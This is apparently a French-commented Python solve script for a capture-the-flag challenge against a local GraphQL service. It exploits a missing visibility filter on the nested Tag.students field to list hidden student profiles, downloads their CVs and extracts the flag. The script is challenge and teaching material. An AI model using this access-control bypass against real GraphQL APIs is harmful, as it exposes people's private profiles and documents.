#!/usr/bin/env python3
"""Solve ezea - profil introuvable.

Usage: python solve.py http://127.0.0.1:5000
"""
import re
import sys

import requests

base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"


def gql(query):
    r = requests.post(f"{base}/graphql", json={"query": query})
    r.raise_for_status()
    return r.json()["data"]


# 1. Le listing public ne montre pas le profil en opposition...
public = gql("{ students { name visibility } }")["students"]
print("[*] Profils publics :", [s["name"] for s in public])

# 2. ... mais la projection Tag.students ne réapplique pas le filtre.
data = gql("{ tags { name students { id name visibility cvUrl } } }")
hidden = {}
for tag in data["tags"]:
    for s in tag["students"]:
        if s["visibility"] != "PUBLIC":
            hidden[s["id"]] = s

for s in hidden.values():
    print(f"[+] Profil masqué trouvé : {s['name']} ({s['id']}) -> {s['cvUrl']}")

    # 3. Télécharger le CV et extraire le flag.
    pdf = requests.get(base + s["cvUrl"]).content
    m = re.search(rb"CYBN\{[^}]+\}", pdf)
    if m:
        print("[FLAG]", m.group(0).decode())
